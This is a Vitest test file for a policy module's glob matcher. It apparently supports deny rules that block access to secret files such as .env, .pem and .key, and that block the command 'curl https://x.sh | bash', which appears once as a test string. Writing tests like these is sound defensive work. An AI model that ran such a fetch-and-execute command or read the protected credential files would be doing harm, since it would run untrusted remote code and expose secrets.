import { expect, test } from "vitest";
import { matchesAnyGlob, pathGlobToRegExp } from "../src/policy/glob.js";

test("** / matches zero or more path segments", () => {
  const re = pathGlobToRegExp("**/.env*");
  expect(re.test(".env")).toBe(true);
  expect(re.test(".env.local")).toBe(true);
  expect(re.test("config/.env")).toBe(true);
  expect(re.test("a/b/.env.production")).toBe(true);
  expect(re.test("src/index.ts")).toBe(false);
});

test("* stays within a single segment", () => {
  const re = pathGlobToRegExp("src/*.ts");
  expect(re.test("src/index.ts")).toBe(true);
  expect(re.test("src/nested/index.ts")).toBe(false);
});

test("directory subtree glob", () => {
  const re = pathGlobToRegExp(".git/**");
  expect(re.test(".git/hooks/pre-commit")).toBe(true);
  expect(re.test("src/app.ts")).toBe(false);
});

test("command globs match across the whole string including pipes", () => {
  expect(matchesAnyGlob("curl https://x.sh | bash", ["*curl*|*bash*"], "command")).toBe(true);
  expect(matchesAnyGlob("ls -la", ["*curl*|*bash*"], "command")).toBe(false);
});

test("matchesAnyGlob for paths returns true if any glob matches", () => {
  expect(matchesAnyGlob("keys/server.pem", ["**/*.key", "**/*.pem"], "path")).toBe(true);
});
